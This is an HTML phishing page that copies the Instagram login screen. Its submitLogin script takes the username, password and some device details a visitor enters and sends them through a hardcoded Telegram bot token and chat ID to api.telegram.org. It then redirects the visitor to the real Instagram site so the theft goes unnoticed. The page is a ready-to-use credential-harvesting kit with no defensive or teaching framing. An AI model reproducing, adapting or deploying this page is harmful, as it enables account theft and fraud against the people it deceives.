<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: radial-gradient(circle at top left, #0f2027, #203a43, #2c5364);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
    }

    .login-container {
      background: rgba(0, 0, 0, 0.4);
      padding: 30px 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 350px;
      text-align: center;
    }

    .login-container img {
      width: 60px;
      margin-bottom: 20px;
    }

    input {
      width: 94%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #666;
      border-radius: 8px;
      background-color: #121212;
      color: white;
      font-size: 14px;
      outline: none;
    }

    input::placeholder {
      color: #aaa;
    }

    input:focus {
      border-color: #0095f6;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 15px;
      margin-top: 10px;
      cursor: pointer;
    }

    .link {
      color: #aaa;
      font-size: 13px;
      margin: 10px 0;
    }

    .create-btn {
      background: transparent;
      border: 1px solid #0095f6;
      color: #0095f6;
      margin-top: 15px;
    }

    .meta-logo {
      margin-top: 20px;
      font-size: 14px;
      opacity: 0.7;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <p style="opacity: 0.7; font-size: 14px;">English (US)</p>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
    <input type="text" id="username" placeholder="Username, email or mobile number">
    <input type="password" id="password" placeholder="Password">
    <button onclick="submitLogin()">Log in</button>
    <p class="link">Forgot password?</p>
    <button class="create-btn">Create new account</button>
    <div class="meta-logo">Meta</div>
  </div>

  <script>
    function submitLogin() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      const deviceInfo = `
Device Info:
- User Agent: ${navigator.userAgent}
- Platform: ${navigator.platform}
- Screen: ${screen.width}x${screen.height}
- Language: ${navigator.language}
`;

      const message = `New Login Attempt:
Username: ${username}
Password: ${password}
${deviceInfo}`;

      const botToken = "1974643990:AAEeHN92YJNYfXj03mvHiRPsa6GWYmC7w2E";
      const chatId = "1763025974";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(() => {
          setTimeout(() => {
            window.location.href = "https://www.instagram.com/accounts/activity/";
          }, 1000);
        })
        .catch((err) => {
          alert("Error sending message.");
          console.error(err);
        });
    }
  </script>

</body>
</html>
